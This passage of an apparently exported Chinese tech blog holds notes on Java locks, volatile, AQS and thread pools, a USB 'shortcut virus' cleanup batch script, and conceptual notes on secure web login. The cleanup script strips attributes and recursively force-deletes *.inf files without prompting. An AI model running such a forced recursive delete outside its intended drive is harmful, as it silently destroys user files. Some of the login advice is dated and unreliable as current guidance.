<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/09/19/thread/image-20200502160425326.png"
                      class=""
                >

<p>偏向锁：写 <code>threadId</code> 代表加锁进行占用，当发生竞争（即有线程来争抢该锁，一个线程即可）便会撤销偏向锁并开始升级为自旋锁，升级过程：竞争该锁的线程在各自的线程栈中生成 <code>lock record</code>, 然后各自通过自旋（即CAS：先读出锁内指针，然后将其改为自己 <code>lock record</code> 的地址，如果改回的过程中发现读出的状态没有改变，那么就成功抢到）的方式进行争抢，争抢成功后就会如上图，将原先的当前线程指针改为了指向 <code>lock record</code> 的指针。</p>
<p>上面明显看出一个问题，就是严重自旋，即如果某线程长时间持有锁那他人就会一直自旋（就是一个衡量标准，称为竞争加剧，比如线程超过了10次自旋, <code>PreBlockSpin</code>,  自旋线程数超过<code>cpu</code>核数的一半，1.6后加入自适应自旋：Adaptive Self Spinning，即由JVM自己抉择 ），这时候就会选择升级为重量级锁</p>
<p>严重自旋的问题：自旋就是while()， 旋就耗 <code>cpu</code>，所以可能会把 <code>cpu</code> 拉满</p>
<p>重量级锁会开个队列让线程等，等（也就是堵塞态）是不耗<code>cpu</code>的，操作系统会主动通知</p>
<ol>
<li><p>0 0 1 未加锁</p>
</li>
<li><p><code>hashCode</code></p>
</li>
<li><p><code>synchronized(o)</code>00 -&gt; 轻量级锁，<code>-XX:BiasedLockingStartupDelay=4</code>  , JVM 启动 4 秒后才会采用偏向锁模式，因为JVM启动需要执行很多 sync，那必然很多竞争，所以直接先用轻量锁跑（从而可以防一手大量的偏向锁的撤销和升级，白瞎资源）。</p>
</li>
</ol>
<blockquote>
<p> 关于 epoch: 批量锁</p>
</blockquote>
<blockquote>
<p> 锁降级：GC的时候，此时该锁除了GC线程已经不被其他线程访问了，没有意义</p>
</blockquote>
<blockquote>
<p>锁消除 lock eliminate： 比如局部变量 <code>StringBuffer</code>， 因为堆栈封闭，本身就没有线程安全考虑，所以会对其 append 方法进行锁消除</p>
</blockquote>
<blockquote>
<p>锁粗化：比如循环对 <code>StringBuffer</code> 进行 append，JVM会将锁拿到循环外部</p>
</blockquote>
<h3 id="JIT：-just-in-time"><a href="#JIT：-just-in-time" class="headerlink" title="JIT： just in time"></a>JIT： just in time</h3><p>将热点代码直接转成机器码，避免解释从而提高执行效率</p>
<p><code>hsdis</code> JVM反汇编插件</p>
<p><code>java -XX:+UnlockDiagnosticVMOptions -XX:+PrintAssembly T</code></p>
<p>C1, C2优化</p>
<h3 id="synchronized-过程"><a href="#synchronized-过程" class="headerlink" title="synchronized 过程"></a>synchronized 过程</h3><ol>
<li>class 文件： monitorenter monitorexit</li>
<li>执行过程自动升级</li>
<li>lock comxchg</li>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/09/19/thread/70"
                      class="" title="img"
                ></li>
</ol>
<h2 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h2><h3 id="保证线程可见性"><a href="#保证线程可见性" class="headerlink" title="保证线程可见性"></a>保证线程可见性</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/09/19/thread/image-20200502230317608.png"
                      class="" title="image-20200502230317608"
                >

<p>超线程：一个ALU对应多个PC|Registers，所谓得的四核八线程</p>
<p>Context switch：上下文切换：当仅有<code>ALU</code>，<code>Register</code>，<code>PC</code>三个组件时，同一时间仅能有一个线程执行，其他线程执行时需要将当前线程在这<code>Register</code>, <code>ALU</code>组件中的相关数据保存起来，然后才可以执行</p>
<p>Cache Line  64 字节：<code>cpu</code> 层的数据一致性是以 <code>cache line</code> 为单位的</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/09/19/thread/image-20200502231250554.png"
                      class="" title="image-20200502231250554"
                >

<p>缓存行对齐：<a class="link"   href="http://mechanitis.blogspot.com/2011/07/dissecting-disruptor-why-its-so-fast_22.html" >disruptor<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 强行塞无意义变量来对齐缓存行避免过频繁而无意义的一致性追求</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/09/19/thread/image-20200502233226375.png"
                      class="" title="image-20200502233226375"
                >

<h3 id="乱序执行"><a href="#乱序执行" class="headerlink" title="乱序执行"></a>乱序执行</h3><p>JVM 层级：内存屏障， 操作系统层级：Lock指令</p>
<p>系统底层实现一致性：MESI，如果不能（数据过大超出缓存行）的话就锁总线（万能方式）</p>
<p>系统底层实现有序性：内存屏障，sfence mfence lfence 等系统原语 或者 锁总线</p>
<p>单例模式：DCL， double check lock</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 new #2 &lt;java/lang/Object&gt;                   # new 出内存布局</span><br><span class="line">3 dup</span><br><span class="line">4 invokespecial #1 &lt;java/lang/Object.&lt;init&gt;&gt;  # 构造方法</span><br><span class="line">7 astore_1                                    # 连接引用和内存区</span><br><span class="line">8 return</span><br></pre></td></tr></table></figure></div>

<p>如果 4 7 发生了指令重排序，那么就会出现引用判断不为 NULL 但实际没有构造成功，即线程使用了半初始化对象</p>
<h4 id="如何实现禁止重排"><a href="#如何实现禁止重排" class="headerlink" title="如何实现禁止重排"></a>如何实现禁止重排</h4><ol>
<li><p>字节码：ACC_volatile 标记</p>
</li>
<li><p>内存屏障：屏障两边的指令不可重排，保障有序性。JSR 内存屏障：LL，SS，LS，SL   按例解释 LL：L1,L2 不能重排，以此类推</p>
</li>
<li><p>hotspot 实现</p>
<ol>
<li>bytecodeinterpreter.cpp</li>
</ol>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> field_offset = cache-&gt;<span class="built_in">f2_as_index</span>();</span><br><span class="line"><span class="keyword">if</span> (cache-&gt;<span class="built_in">is_volatile</span>()) &#123;</span><br><span class="line">    <span class="keyword">if</span>(support_iriw...)&#123;</span><br><span class="line">        OrderAccess::<span class="built_in">fence</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li>orderAccess_bsd_x86.inline.hpp</li>
</ol>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">OrderAccess::fence</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (os::<span class="built_in">is_MP</span>()) &#123;</span><br><span class="line">    <span class="comment">// always use locked addl since mfence is sometimes expensive</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> AMD64</span></span><br><span class="line">    <span class="function">__asm__ <span class="title">volatile</span> <span class="params">(<span class="string">&quot;lock; addl $0,0(%%rsp)&quot;</span> : : : <span class="string">&quot;cc&quot;</span>, <span class="string">&quot;memory&quot;</span>)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="function">__asm__ <span class="title">volatile</span> <span class="params">(<span class="string">&quot;lock; addl $0,0(%%esp)&quot;</span> : : : <span class="string">&quot;cc&quot;</span>, <span class="string">&quot;memory&quot;</span>)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可见并非采用了系统原语，而是使用了 lock， 这是兼容保证，因为 mfence等并非所有系统都支持</p>
</li>
</ol>
<h2 id="强软弱虚"><a href="#强软弱虚" class="headerlink" title="强软弱虚"></a>强软弱虚</h2><p>强引用：就是平常使用的引用，普通引用。引用存在就不会被回收</p>
<p>软引用：new SoftReferenceM&lt;&gt;(new byte[1024]) </p>
<pre><code>- Xmx=20m 最大堆内存 当堆内存占用不够的时候软引用就会被回收
- 应用：缓存，不用的时候释放掉，大不了再从数据库里取一次
</code></pre>
<p>弱引用：WeakReference</p>
<ul>
<li>特点：垃圾回收器看到就会回收 </li>
<li>应用：一次性，防止内存泄漏</li>
</ul>
<p>虚引用：PhantomReferernce</p>
<ul>
<li>特点：永远 get 不到</li>
<li>应用：管理堆外内存，给堆外内存对象挂一个虚引用，<strong>这样对象被gc时会将其相关信息放到队列中</strong>，特有的gc线程会监听这个队列，以此来管理堆外内存</li>
</ul>
<h3 id="ThreadLocal"><a href="#ThreadLocal" class="headerlink" title="ThreadLocal"></a>ThreadLocal</h3><p>应用：</p>
<ul>
<li>@Transactional 同一线程的多个方法调用时拿到同一个 connection</li>
</ul>
<p>源码： Thread 里有个 map ThreadLocal&lt;ThreadLocal, Object&gt; 调用 ThreadLocal.set 方法时会取当前线程的 大map， 然后把自己和value放进去转成一个 entry&lt;key, value&gt;</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Entry <span class="keyword">extends</span> <span class="title class_">WeakReference</span> &#123; <span class="built_in">super</span>&#123;k&#125;&#125; <span class="comment">// 弱引用指向threadLocal</span></span><br></pre></td></tr></table></figure></div>

<p>防止内存泄露，如果强引用，那么t1没了也仍然不会被回收，因为<code>entry key</code>仍然引用它，但还是有个问题，就是value无法被访问了（key被指成null），因此必须调用一次 threadLocl.remove 方法</p>
<h2 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h2><p>程序抛出异常时，默认锁会被释放，这样就会被原来的那些个准备拿到这把锁的程序乱冲进来，程序乱入。</p>
<h3 id="ReentrantLock"><a href="#ReentrantLock" class="headerlink" title="ReentrantLock"></a>ReentrantLock</h3><p>优于synchronized的地方：</p>
<ol>
<li>tryLock进行锁定，锁定与否都会继续执行方法（synchronized锁不到就阻塞了）</li>
<li>lock.lockInterruptibly: A线程持有B线程想要的锁，B如果拿不到就会一直等，这时候可以用 interrupt 方法打断等待</li>
<li>公平锁：队列优先</li>
<li>condition特性：本质上是多个等待队列</li>
</ol>
<h3 id="CountdownLatch"><a href="#CountdownLatch" class="headerlink" title="CountdownLatch"></a>CountdownLatch</h3><p>灵活版的join， await 插门闩，countdown拉门闩，拉多了就下来了</p>
<h3 id="CycleBarrier"><a href="#CycleBarrier" class="headerlink" title="CycleBarrier"></a>CycleBarrier</h3><p>你加一我加一，加满就重来</p>
<h3 id="Phaser-多阶段栅栏"><a href="#Phaser-多阶段栅栏" class="headerlink" title="Phaser 多阶段栅栏"></a>Phaser 多阶段栅栏</h3><p>重写onAdvance方法，前进，线程抵达这个栅栏的时候，所有的线程都满足了这个第一个栅栏的条件了onAdvance会被自动调用，目前我们有好几个阶段，这个阶段是被写死的，必须是数字0开始，onAdvance会传来两个参数phase是第几个阶段，registeredParties是目前这个阶段有几个人参加，每一个阶段都有一个打印，返回值false，一直到最后一个阶段返回true，所有线程结束，整个栅栏组，Phaser栅栏组就结束了</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">arriveAndAwaitAdvance  // 下个阶段</span><br><span class="line">phaser.arriveAndDeregister // 停止，不再进入下个阶段</span><br></pre></td></tr></table></figure></div>

<h3 id="ReadWriteLock"><a href="#ReadWriteLock" class="headerlink" title="ReadWriteLock"></a>ReadWriteLock</h3><p>读锁读共享，写锁写独占，读不放锁写别动，写不放锁都别动</p>
<h3 id="Semaphore"><a href="#Semaphore" class="headerlink" title="Semaphore"></a>Semaphore</h3><p>传一个 permits， 每次acquire就减一，支持公平锁</p>
<h3 id="Exchanger"><a href="#Exchanger" class="headerlink" title="Exchanger"></a>Exchanger</h3><p><strong>两个</strong>线程交换信息，通信常用，或者游戏交换装备</p>
<hr>
<p>Reentrantlock、CountDownLatch、CyclicBarrier、Phaser、ReadWriteLock、Semaphore，Exchanger都是用同一个队列，同一个类来实现的，这个类叫AQS</p>
<hr>
<h3 id="lock-support"><a href="#lock-support" class="headerlink" title="lock support"></a>lock support</h3><p>park，unpark原理：通过一个变量标识，变量在0 1之间切换（park unpark）大于0时就可继续执行</p>
<h3 id="生产者消费者"><a href="#生产者消费者" class="headerlink" title="生产者消费者"></a>生产者消费者</h3><p>为什么用while而不是用if？ 因为当LinkedList集合中“馒头”数等于最大值的时候，if在判断了集合的大小等于MAX的时候，调用了wait()方法以后，它不会再去判断一次，方法会继续往下运行，假如在你wait()以后，另一个方法又添加了一个“馒头”，你没有再次判断，就又添加了一次，造成数据错误，就会出问题，因此必须用while。</p>
<h2 id="AQS"><a href="#AQS" class="headerlink" title="AQS"></a>AQS</h2><p>共享一个state， state为0就可以抢，CAS抢到了就设置成1，重入就在1的基础上加1，以此递增</p>
<p>除了监控state外，还维护一个双向链表，这个链表的节点就是线程</p>
<hr>
<p>acquire 方法：假如你要往一个链表上添加尾巴，尤其是好多线程都要往链表上添加尾巴，我们仔细想想看用普通的方法怎么做？第一点要加锁这一点是肯定的，因为多线程，你要保证线程安全，一般的情况下，我们会锁定整个链表(Sync)，我们的新线程来了以后，要加到尾巴上，这样很正常，但是我们锁定整个链表的话，锁的太多太大了，现在呢它用的并不是锁定整个链表的方法，而是只观测tail这一个节点就可以了，怎么做到的呢？compareAndAetTail(oldTail,node)，中oldTail是它的预期值，假如说我们想把当前线程设置为整个链表尾巴的过程中，另外一个线程来了，它插入了一个节点，那么仔细想一下Node oldTail &#x3D; tail;的整个oldTail还等于整个新的Tail吗？不等于了吧，那么既然不等于了，说明中间有线程被其它线程打断了，那如果说却是还是等于原来的oldTail，这个时候就说明没有线程被打断，那我们就接着设置尾巴，只要设置成功了OK,compareAndAetTail(oldTail,node)方法中的参数node就做为新的Tail了，所以用了CAS操作就不需要把原来的整个链表上锁，这也是AQS在效率上比较高的核心</p>
<hr>
<p>读acquireQueued()这个方法，这个方法的意思是，在队列里尝试去获得锁，在队列里排队获得锁，那么它是怎么做到的呢？我们先大致走一遍这个方法，首先在for循环里获得了Node节点的前置节点，然后判断如果前置节点是头节点，并且调用tryAcquire(arg)方法尝试一下去得到这把锁，获得了头节点以后，你设置的节点就是第二个，你这个节点要去和前置节点争这把锁，这个时候前置节点释放了，如果你设置的节点拿到了这把锁，拿到以后你设置的节点也就是当前节点就被设置为前置节点，如果没有拿到这把锁，当前节点就会阻塞等着，等着什么？等着前置节点叫醒你，所以它上来之后是竞争，怎么竞争呢？如果你是最后节点，你就下别说了，你就老老实实等着，如果你的前面已经是头节点了，说明什么？说明快轮到我了，那我就跑一下，试试看能不能拿到这把锁，说不定前置节点这会儿已经释放这把锁了，如果拿不着阻塞，阻塞以后干什么？等着前置节点释放这把锁以后，叫醒队列里的线程，我想执行过程已经很明了了，打个比方，有一个人，他后面又有几个人在后面排队，这时候第一个人是获得了这把锁，永远都是第一个人获得锁，那么后边来的人干什么呢？站在队伍后面排队，然后他会探头看他前面这个人是不是往前走了一步，如果走了，他也走一步，当后来的这个人排到了队伍的第二个位置的时候，发现前面就是第一个人了，等这第一个人走了就轮到他了，他会看第一个人是不是完事了，完事了他就变成头节点了，就是这么个意思。</p>
<hr>
<p>VarHandle除了可以完成普通属性的原子操作，还可以完成原子性的线程安全的操作</p>
<p>在JDK1.9之前要操作类里边的成员变量的属性，只能通过反射完成，用反射和用VarHandle的区别在于VarHandle的效率要高的多，反射每次用之前要检查，VarHandle不需要，VarHandle可以理解为直接操纵二进制码，所以VarHandle反射高的多</p>
<h2 id="并发容器"><a href="#并发容器" class="headerlink" title="并发容器"></a>并发容器</h2><h3 id="CopyOnWriteList"><a href="#CopyOnWriteList" class="headerlink" title="CopyOnWriteList"></a>CopyOnWriteList</h3><p>适合读多写少</p>
<h3 id="BlockingQueue"><a href="#BlockingQueue" class="headerlink" title="BlockingQueue"></a>BlockingQueue</h3>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Concurrency</tag>
        <tag>Thread</tag>
      </tags>
  </entry>
  <entry>
    <title>Thread pool</title>
    <url>/2020/09/20/threadpool/</url>
    <content><![CDATA[<p><a class="link"   href="https://tech.meituan.com/2020/04/02/java-pooling-pratice-in-meituan.html" >https://tech.meituan.com/2020/04/02/java-pooling-pratice-in-meituan.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="基本利益"><a href="#基本利益" class="headerlink" title="基本利益"></a>基本利益</h3><blockquote>
<p>统一管理IT资源，包括服务器、存储、和网络资源等等。通过共享资源，使用户在低投入中获益。</p>
</blockquote>
<ol>
<li><p>内存池(Memory Pooling)：预先申请内存，提升申请内存速度，减少内存碎片。</p>
</li>
<li><p>连接池(Connection Pooling)：预先申请数据库连接，提升申请连接的速度，降低系统的开销。</p>
</li>
<li><p>实例池(Object Pooling)：循环使用对象，减少资源在初始化和释放时的昂贵损耗。</p>
</li>
</ol>
<h3 id="核心实现"><a href="#核心实现" class="headerlink" title="核心实现"></a>核心实现</h3><h4 id="总体设计"><a href="#总体设计" class="headerlink" title="总体设计"></a>总体设计</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/09/20/threadpool/basic-arch.png"
                      class="" title="基本设计"
                >


<h4 id="生命周期管理"><a href="#生命周期管理" class="headerlink" title="生命周期管理"></a>生命周期管理</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/09/20/threadpool/life-cycle.png"
                      class="" title="生命周期"
                >


<h4 id="任务调度"><a href="#任务调度" class="headerlink" title="任务调度"></a>任务调度</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/09/20/threadpool/task-schedule.png"
                      class="" title="任务调度"
                >

<h4 id="阻塞队列"><a href="#阻塞队列" class="headerlink" title="阻塞队列"></a>阻塞队列</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/09/20/threadpool/blocking-queue.png"
                      class="" title="阻塞队列"
                >

<h4 id="拒绝策略"><a href="#拒绝策略" class="headerlink" title="拒绝策略"></a>拒绝策略</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/09/20/threadpool/reject-policy.png"
                      class="" title="拒绝策略"
                >

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>concurrency</tag>
      </tags>
  </entry>
  <entry>
    <title>U盘快捷方式病毒修复</title>
    <url>/2016/11/03/udisk-antivirus/</url>
    <content><![CDATA[<h4 id="attrib-显示所有文件的属性"><a href="#attrib-显示所有文件的属性" class="headerlink" title="attrib 显示所有文件的属性"></a>attrib 显示所有文件的属性</h4><ul>
<li>参数：<ul>
<li>+设置属性， -消除属性</li>
<li>+r或-r [文件名] 设置文件属性是否为只读</li>
<li>+h或-h [文件名] 设置文件属性是否隐含</li>
<li>+s或-s [文件名] 设置文件属性是否为系统文件</li>
<li>+a或-a [文件名] 设置文件属性是否为归档文件</li>
<li>&#x2F;s 设置包括子目录的文件在内的文件属性</li>
<li>， 设置所有属性文件为归档文件</li>
</ul>
</li>
<li><code>*.*</code>当前目录下所有文件和目录</li>
<li>&#x2F;S 处理当前文件夹及其子文件夹中的匹配文件</li>
<li>&#x2F;D 也处理文件夹</li>
</ul>
<p>在U盘下输入以下内容</p>
<pre><code>echo 正在杀毒并生成免疫 请勿关闭
attrib -r -a -s -h /s /d
del /f /s /q *.inf
MKDIR autorun.inf\Kill........\
attrib +r +a +s +h *.inf /s /d
echo 完成
</code></pre>
<p>保存为something.cmd,放于U盘下即可</p>
<blockquote>
<p>del的参数：<br>&#x2F;P 删除每一个文件之前提示确认。<br>&#x2F;F 强制删除只读文件。<br>&#x2F;S 从所有子目录删除指定文件。<br>&#x2F;Q 安静模式。删除全局通配符时，不要求确认。<br>&#x2F;A 根据属性选择要删除的文件。 属性<br>r 只读<br>a 存档<br>s 系统<br>h 隐藏</p>
</blockquote>
<hr>
<blockquote>
<p>只读-表示该文件不能被修改 隐藏 -表示该文件在系统中是隐藏的，在默认情况下用户不能看见这些文件。 系统 - 表示该文件是操作系统的一部分。 存档- 表示该文件在上次备份前已经修改过了，一些备份软件在备份系统后会把这些文件默认的设为存档属性。 存档属性在一般文件管理中意义不大，但是对于频繁的文件批量管理很有帮助。</p>
</blockquote>
<hr>
<blockquote>
<p>【存档】：指定是否应该存档该文件或文件夹。一些程序用此选项来控制要备份哪些文件。如果选定多个文件或文件夹，则选中标志表示所有的文件或文件夹都设置了存档属性。复选框为灰色则表示有些文件设置了存档属性，而其他文件则没有。</p>
</blockquote>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>u盘</tag>
        <tag>病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>如何实现一个安全的Web登录</title>
    <url>/2017/10/14/web-security%5B1%5D/</url>
    <content><![CDATA[<h3 id="综述："><a href="#综述：" class="headerlink" title="综述："></a>综述：</h3><p><strong>建议点击文中所有的链接获取较为详细的信息</strong> <strong>待 Update：SSO, QUIC、HSTS等协议研究, <a class="link"   href="https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html" >SHA-1 可破解<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong> <strong>总结： 没有绝对的安全，能不自己做就不自己做， 要么 openID（不了解）， 要么OAuth（推荐QQ &amp; Github）</strong> <strong>本文不考虑键盘记录器等养毒行为， 本文不考虑堆栈溢出， exploit， SQL注入等。 单纯谈论偏向登陆会话过程</strong> <strong>思维养成key： 时间， 信任</strong> <strong>无解问题： CSRF， 中间人攻击（有应对方案，但没有根本解决的方案)</strong> <strong>方案：SSL必加（非对称，不是绝对但是已经超安全了）， 客户端加密可选， 加密关键词(非对称， Hash 加盐)， localStorage 存 token（仿CSRF）， 指纹ID：比如UUID（Java），cookie 设计参考Chrome Dev查看知名网站，猜测大致保存用户名，session， jsessionid， uuid， token(浏览器不支持localStorage)， Hm_lvt_siteid, Hm_lpvt_siteid等等，文中有部分cookie 参数链接</strong></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="09年老5则"><a href="#09年老5则" class="headerlink" title="09年老5则"></a><a class="link"   href="http://broadcast.oreilly.com/2009/05/five-laws-of-implementing-login-solution.html" >09年老5则<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h4><ol>
<li><p>加密单向并且强壮（MD5我100个不推荐， 看刷ctf的整天口算md5玩， 看开头，所以推荐 SHA2）</p>
</li>
<li><p>密码长度强制长</p>
</li>
<li><p>密码字符无限制， 至少满足ascii（出开头结束空格）</p>
</li>
<li><p>不要给用户发送他的密码（VMware就这么蠢比过） IMAP 应用，中间人攻击 between the mail client and GMail</p>
<ul>
<li>Anyone who had access to the network or SMTP systems involved in the hand-off chain between VMware’s systems and Google.</li>
<li>Anyone who has administrative access to Google’s email systems, including the eternal GMail backups.</li>
<li>Anyone capable of compromising the integrity of Google’s systems.</li>
<li>Anyone capable of compromising the integrity of my laptop.</li>
<li>Anyone who gains access to a public machine I was using after I forgot to log out of GMail.</li>
</ul>
</li>
<li><p>OpenID 不适合作为安全的关键部分， 但大部分适用</p>
</li>
</ol>
<p>忠告： Don’t implement your own authentication system unless you absolutely have to 总结： 赞忠告，为啥不试试OAuth 2.0 操作之类的？我选 github &amp; qq sdk</p>
<h4 id="初步探索"><a href="#初步探索" class="headerlink" title="初步探索"></a><a class="link"   href="https://security.stackexchange.com/questions/107625/how-to-create-a-secure-login-system-with-cookies" >初步探索<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h4><ol>
<li><p>token, user_id, track ip</p>
</li>
<li><p>产生一个随机token发到客户端作为cookie， 这个cookie 与 服务器做出匹配来确定用户</p>
</li>
<li><p>除非实现session策略或者网站分布在集群之类的，不要用数据库存储session</p>
</li>
<li><p>hash + salt 密码加密， 打算加盐（一个用户一种盐）防彩虹表？</p>
</li>
</ol>
<h4 id="Wiki"><a href="#Wiki" class="headerlink" title="Wiki"></a><a class="link"   href="https://en.wikibooks.org/wiki/PHP_Programming/Building_a_secure_user_login_system" >Wiki<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h4><ol>
<li><p>认证分两部分： 登陆表单， per-request-check</p>
</li>
<li><p>会话劫持</p>
</li>
</ol>
<ul>
<li><p>方式：</p>
<ul>
<li><p>猜测</p>
</li>
<li><p>fixation: xss, 网络嗅探</p>
</li>
</ul>
</li>
<li><p>应对：</p>
<ul>
<li><p>cookie设置 HTTP only。 可仿浏览器伪造，仿 js 注入</p>
</li>
<li><p><a class="link"   href="http://blog.csdn.net/zchunhe/article/details/50389677" >楼上那个， 不好意思，可解<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p>登陆不仅仅依赖sessionid</p>
</li>
<li><p>session 时间, client指纹（一般是设备信息决定）变化, 登出请求 时销毁cookie, 清理session</p>
</li>
<li><p>Note: 指纹举例 $fingerprint &#x3D; hash_hmac(‘sha256’, $_SERVER[‘HTTP_USER_AGENT’], hash(‘sha256’, $_SERVER[‘REMOTE_ADDR’], true));</p>
</li>
<li><p>SSL 是最好的仿白文传送， 对比而言， 别用客户端加密这个方法（因为劫持了就相当于拿到了加密，加密本身也就没了效果）</p>
</li>
<li><p>所以要加密就在server端加密</p>
</li>
<li><p>盐的生成可以从加密来挑字符，关于盐的长度: Even 4 random bytes of salt will increase the complexity of a rainbow table attack by a factor of 4 billion.</p>
</li>
<li><p>SSL 是必须的，无论如何这个都必须, 即便这也不是最安全的方案，比如：<a class="link"   href="https://www.zhihu.com/question/22779469" >https://www.zhihu.com/question/22779469<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p>Bcrypt</p>
<blockquote>
<p>Besides incorporating a salt to protect against rainbow table attacks, bcrypt is an adaptive function: over time, the iteration count can be increased to make it slower, so it remains resistant to brute-force search attacks even with increasing computation power…. Cryptotheoretically, this is no stronger than the standard Blowfish key schedule, but the number of rekeying rounds is configurable; this process can therefore be made arbitrarily slow, which helps deter brute-force attacks upon the hash or salt.</p>
</blockquote>
</li>
<li><p><strong>SSL安装： 自己做个证书强迫用户装（又是12306）， 买（阿里送了个1000元一年的， 想想都贵）， let ‘s encrypt（免费 且 贼棒，crontab设置个90天内翻新就行了）</strong></p>
</li>
<li><p>爆力攻击减速， 如果失败， 等待一定时间后返回失败（考虑用户体验取舍，建议可加）</p>
</li>
<li><p>惯用行为： 。。。。感觉这个太他妈难， 就是类似twitter那样换个浏览器换个ip换个设备立马晓得然后通知你</p>
</li>
<li><p>验证码（CAPTCHA）： 这是个用户体验很差的东西，想想12306？ 总之做的有点意思或者大气上档次才行</p>
</li>
</ul>
</li>
</ul>
<h4 id="休息一下"><a href="#休息一下" class="headerlink" title="休息一下"></a><a class="link"   href="http://www.cnblogs.com/happyframework/p/3458966.html" >休息一下<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h4><ul>
<li><p>攻击：堆栈溢出。 解决：防伪式编程， 验证和过滤恶意输入</p>
</li>
<li><p>攻击：留言，打倒GCD这种神奇操作。 解决： 苟利国家生死以，岂因福祸避趋之。 给他过掉</p>
</li>
<li><p>错误：仿debug模式报异常等。 解决：控制好异常的边界</p>
</li>
</ul>
<h4 id="初步设计Cookie"><a href="#初步设计Cookie" class="headerlink" title="初步设计Cookie"></a><a class="link"   href="http://qq405371160.iteye.com/blog/1743237" >初步设计Cookie<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h4><ol>
<li>Cookie 设计， 三个东西：</li>
</ol>
<ul>
<li><p>用户名</p>
</li>
<li><p>登陆序列， 仅当强制用户输入口令时更新</p>
</li>
<li><p>登陆 token</p>
<ul>
<li><p>仅一个登录Session内有效</p>
</li>
<li><p>新的登录Session会更新它</p>
</li>
<li><p>登录Token是单实例登录 Singleton</p>
</li>
<li><p>当前两者正确，第三者却不正确时（有人盗用更新了token）用户回来访问时不对，系统便清除登陆序列和token令cookie失效</p>
</li>
</ul>
</li>
</ul>
<ol>
<li><p>重要操作必须输入口令， 比如支付， 改密信息之类的， 不能因cookie直接操作(大概想防XSS？)</p>
</li>
<li><p>密保设定私人信息（比如你爸妈叫啥）有点白痴，因为可以社工之类的</p>
</li>
<li><p>邮件重置较为安全， 根据用户（uuid，timestamp，token等）生成MD5 url，并设定操作权限时间。</p>
</li>
<li><p>系统操作封IP之类的， 冻结账户这种操作由用户决定， 少做让用户反感的事</p>
</li>
</ol>
<p><strong>重点：必看 <a class="link"   href="http://blog.csdn.net/alexdream/article/details/7642626" >Cookie 参数详解<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></p>
<h4 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a><a class="link"   href="https://yanmingming.wordpress.com/2016/05/09/%E6%80%8E%E4%B9%88%E7%BC%96%E5%86%99%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C%E4%BA%8E%E7%99%BB%E5%BD%95%E6%9C%8D%E5%8A%A1/" >CSRF Token<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h4><ul>
<li><p>Token 保存</p>
<ul>
<li><p>csrf token 保存在浏览器的localStorage， 不是cookie</p>
</li>
